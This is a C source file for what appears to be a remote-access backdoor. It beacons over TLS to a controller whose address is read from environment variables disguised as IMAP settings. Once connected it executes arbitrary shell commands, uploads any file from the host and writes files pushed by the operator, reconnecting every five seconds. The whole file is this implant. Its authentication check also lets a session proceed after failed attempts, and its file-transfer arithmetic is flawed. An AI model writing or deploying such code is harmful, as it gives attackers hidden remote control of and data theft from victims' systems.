#include "server.h"

// Prototype functions
int resolveandconnect(int *, int8_t *, int);
SSL_CTX* initCTX(void);
int cmdshell(SSL *);
int getfile(SSL *);
int putfile(SSL *);
int entersession(SSL *, int *);
ssize_t ssl_readall(SSL *, uint8_t *, size_t, size_t *);
ssize_t ssl_writeall(SSL *, uint8_t *, size_t, size_t *);
ssize_t readall(int, uint8_t *, size_t, size_t *);
ssize_t writeall(int, uint8_t *, size_t, size_t *);

int resolveandconnect(int *sockfd, int8_t *addr, int port) {
  int status;
  char portstr[6];
  int connected = 0;
  struct timeval timeout;
  struct addrinfo hints, *serveraddr, *p;
  int keepalive = 1;
  int keepcnt = 3;
  int keepidle = 5; 
  int keepintvl = 5;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  snprintf(portstr, 6,"%d", port);

  if ((status = getaddrinfo((char *)addr, portstr, &hints, &serveraddr)) != 0) {
    return -1;
  }

  for(p = serveraddr; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if (((*sockfd) = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      continue;
    }

    if (connect((*sockfd), p->ai_addr, p->ai_addrlen) < 0) {
      continue;         
    }
    connected = 1;
    break;
  }

  freeaddrinfo(serveraddr);  // All done with the struct at this point

  if (connected == 0) {
    return -1;
  }

  timeout.tv_sec = 90;
  timeout.tv_usec = 0;

  if (setsockopt(*sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
    return -1;
  }
  if (setsockopt(*sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {
    return -1;
  }

  // Set keepalives
  setsockopt(*sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int));
  setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int));
  setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int));
  setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int));

  if (fcntl(*sockfd, F_SETFL, O_NONBLOCK) < 0) {
    return -1;
  }

  return 0;
}

SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_client_method();       // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}
/*
int newconn(SSL *ssl, pid_t *pids) {
  uint8_t buf[4096] = {0};
  pid_t pid;
  char addr[INET6_ADDRSTRLEN];
  char port[6];
  size_t ts, tr;

  ssl_writeall(ssl, '100', 4, &ts);
  ssl_readall(ssl, addr, sizeof(addr), &tr);
  ssl_writeall(ssl, '101', 4, &ts);
  ssl_readall(ssl, port)

  pid = fork();
  if (pid == -1) {
    ssl_writeall(ssl, '-1', 3, &ts);
  } else if (pid == 0) {
    setenv("IMAP_SERVER", addr, 1);
    setenv("IMAP_PORT", port, 1);
    sprintf(buf, getenv("PATH"));
    sprintf(buf + strlen(buf), ":.");
    setenv("PATH",buf);
    excelp('sbs');
  } else {
    ssl_writeall(ssl, pid, sizeof(pid), &tr);
  }

}
*/
int cmdshell(SSL *ssl) {
  //https://stackoverflow.com/questions/33884291/pipes-dup2-and-exec
  //https://stackoverflow.com/questions/21558937/i-do-not-understand-how-execlp-works-in-linux
  FILE *fp;
  int res;
  size_t total_sent = 0, total_read = 0;
  uint8_t buf[2048] = {0};

  fp = popen("date", "r");
  while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
    if (ssl_writeall(ssl, buf, sizeof(buf), &total_sent) < 0) {
      pclose(fp);
      return -1;
    }
  }
  pclose(fp);

  memset(buf, 0, sizeof(buf));
  while(ssl_readall(ssl, buf, sizeof(buf), &total_read) > 0) {
    fp = NULL;
    if ((res = strcmp((char *)buf, "exit\n")) == 0) {
      return 0;
    }

    if ((fp = popen((char *)buf, "r")) == NULL) {
      if (ssl_writeall(ssl, (uint8_t *)"failed", 7, &total_sent) < 0) {
        return -1;
      }
      continue;
    }

    while(fgets((char *)buf, sizeof(buf), fp) != NULL) {
      ssl_writeall(ssl, buf, sizeof(buf), &total_sent);
      memset(buf, 0, sizeof(buf));
    }
    ssl_writeall(ssl, (uint8_t *)"", 1, &total_sent);

    memset(buf, 0, sizeof(buf));
    pclose(fp);
  }
  
  return 0;
}

int getfile(SSL *ssl) {
  int fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  struct stat st;
  size_t total_recv = 0, total_sent = 0, total_read = 0;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"300", 4, &total_sent) < 0) {
    return -1;
  }

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0) {
    return -1;
  }

  // Ensure we can open the file that is being asked for
  if((fd = open((char *)buf, O_RDONLY)) == -1) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3, &total_sent) < 0) {
      return -1;
    }
    return 0;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fd, &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  if (ssl_writeall(ssl, ans, sizeof(ans), &total_recv) < 0) {
    close(fd);
    return -1;
  }

  // Send the file
  total_sent = 0;
  while(total_sent < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    readall(fd, buf, (size_t)filesize - total_read % sizeof(buf), &total_read);
    if (ssl_writeall(ssl, buf, sizeof(buf), &total_sent) < -1) {
      break;
    }
  }

  close(fd);
  return 0;
}

int putfile(SSL *ssl) {
  int fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t total_recv = 0, total_sent = 0, written = 0;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"400", 4, &total_sent) < 0) {
    return -1;
  }

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0) {
    return -1;
  }

  // Ensure we can open the file that is being asked for
  if((fd = open((char *)buf, O_WRONLY | O_APPEND | O_CREAT, 0644)) == -1) {
    if(ssl_writeall(ssl, (uint8_t *)"-1", 3, &total_sent) < 0) {
      return -1;
    }
    return 0;
  }

  if (ssl_writeall(ssl, (uint8_t *)"401", 4, &total_sent) < 0) {
    close(fd);
    return -1;
  }

  // Recieve the filesize from the client
  ssl_readall(ssl, ans, sizeof(ans), &total_recv);
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    return 0;
  };

  // Download the file
  while(written < (size_t)filesize) {
    if (ssl_readall(ssl, buf, sizeof(buf), &total_recv) < 0) {
      break;
    }
    if (writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written) < 0) {
      break;
    }
    memset(buf, 0, sizeof(buf));
  }
  close(fd);

  return 0;
}

int entersession(SSL *ssl, int *clientfd) {
  int count = 0, cmd, conn = 0, res;
  size_t total_sent = 0, total_read = 0;
  uint8_t buf[4096] = {0};

  // Attach the socket descriptor to the SSL conneciton state
  SSL_set_fd(ssl, *clientfd);                         
  while((conn = SSL_connect(ssl)) <= 0) {
    switch(SSL_get_error(ssl, conn)) {
      case SSL_ERROR_WANT_READ:
      case SSL_ERROR_WANT_WRITE:
        break;
    }
  }

  // Make sure we are gtg with non blocking mode
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
  SSL_set_mode(ssl, SSL_MODE_ENABLE_PARTIAL_WRITE);
  SSL_set_mode(ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);

  // Message the client that we are ready to authenticate
  if (ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent) < 0) {
    return -1;
  }          

  // Read the authentication secret into memory
  if (ssl_readall(ssl, buf, sizeof(buf), &total_read) < 0) {
    return -1;
  }

  // Keep checking to see if the sent auth message is gtg
  while ((res = strncmp((char *)buf, AUTH, strlen(AUTH)) != 0) && count < 3) {       
    if (ssl_writeall(ssl, (uint8_t *)"50", 3, &total_sent) < 0) {
      return -1;
    }
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf), &total_read) < 0) {
      return -1;
    }
    count++;
  }
  if (ssl_writeall(ssl, (uint8_t *)"10", 3, &total_sent) < 0) {
    return -1;
  }

  while(1) {
    // Wait for the client to tell me to do something
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf), &total_read) < 0) {
      break;
    }
    cmd = atoi((char *)buf);

    // Run the specified command
    switch (cmd) {
      case NEW:
        //newconn(ssl);
        break;
      case CMD:
        res = cmdshell(ssl);
        break;
      case GET:
        res = getfile(ssl);
        break;
      case PUT:
        res = putfile(ssl);
        break;
      case TUN:
        //tunnel(ssl);
        break;
      case BYE:
        goto cleanup;
      default:
        break;
    }
    if (res < 0) {
      break;
    }
  }

  cleanup:
  return 0;
}

ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len, size_t *total_recv) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r <= 0) {
        if (SSL_get_error(ssl, r) == SSL_ERROR_WANT_READ) {
          continue;
        }
        return -1;
      } else {
        recvd += r;
        (*total_recv) += r;
        if (strcmp((char *)&buf[recvd-1], (char *)"\0") == 0) {
          break;
        }
      }
    }
    return r;
}

ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len, size_t *total_sent) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) <= 0) {
      if (SSL_get_error(ssl, s) == SSL_ERROR_WANT_WRITE) {
        continue;
      }
      return -1;
    }
    (*total_sent) += s;
    sent += s;
  }

  return s;
}

ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
  ssize_t r = 0;
  size_t readin = 0;

  while(readin < len) {
    if ((r = read(fd, &buf[readin], len-readin)) <= 0) {
      break;
    }
    (*total_read) +=r;
    readin += r;
  }

  return r;
}

ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
  ssize_t w = 0;
  size_t written = 0;
  
  while(written < len) {
    if ((w = write(fd, &buf[written], len-written)) < 0) {
      break;
    } else if (w == 0) {
      break;
    }
    (*total_written) += w;
    written += w;
  }

  return w;
}

int main(void) {
  int res, time = 5;
  SSL_CTX *ctx;
  SSL *ssl;
  int clientfd;
  const char* addr;
  const char* port;

  //daemon(0,0);

  addr = getenv("IMAP_SERVER");
  port = getenv("IMAP_PORT");

  if (addr == NULL || port == NULL) {
    return -1;
  }

  while (1) {
    SSL_library_init();
    ctx = initCTX();
    ssl = SSL_new(ctx);                             // Create new SSL connection state

    if ((res = resolveandconnect(&clientfd, (int8_t *)addr, atoi((char *)port))) != 0) {
      goto reset;
    }
    
    SSL_set_fd(ssl, clientfd);
    entersession(ssl, &clientfd);                    // Enter an actual session with the client

    SSL_free(ssl);                                  // Release connection state
    close(clientfd);                                // Close socket file descriptor
    SSL_CTX_free(ctx);                              // Release the SSL contex

    reset:
    sleep(time);                                    // Sleep for a specified amount of time before sending another probe.
  }

  return 0;
}